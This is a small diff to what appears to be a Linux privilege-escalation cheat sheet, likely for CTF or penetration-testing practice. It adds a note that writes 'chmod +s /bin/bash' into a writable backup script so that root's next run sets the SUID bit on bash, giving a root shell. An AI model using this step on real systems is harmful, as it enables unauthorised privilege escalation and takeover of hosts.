@@ -102,3 +102,9 @@ find / -user username 2>/dev/null | grep -v 'proc\|run\|sys'
 ```
 /sbin/ifconfig
 ```
+
+### files with 777 permission
+
+```
+echo 'chmod +s /bin/bash' > etc_Backup.sh
+```
